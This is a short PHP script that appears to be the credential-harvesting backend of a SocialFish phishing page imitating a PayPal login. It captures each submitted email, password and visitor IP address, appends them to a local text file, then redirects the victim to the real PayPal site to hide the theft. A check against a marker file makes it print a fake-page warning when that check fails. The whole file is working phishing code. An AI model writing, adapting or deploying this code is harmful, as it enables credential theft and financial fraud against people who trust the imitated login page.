<?php
$var = $_POST['login_email'];
$var2 = $_POST['login_password'];
$ip = $_SERVER[ 'REMOTE_ADDR' ];
$myFile = file_get_contents("protect.html");
$searchString = "<html><title>There's a Phishing Page generated by SocialFish in this website.</title></html>";
if($myFile == $searchString) {
    file_put_contents("cat.txt", "[EMAIL]: " . $var . " [PASS]: " . $var2 . " [IP]: " . $ip ."\n", FILE_APPEND);
    header('Location: https://www.paypal.com/');
}
if($myFile != $searchString) {
    echo "***ALERT! I AM A FAKE PAGE | DO NOT TRUST ME";
}
exit();
?>

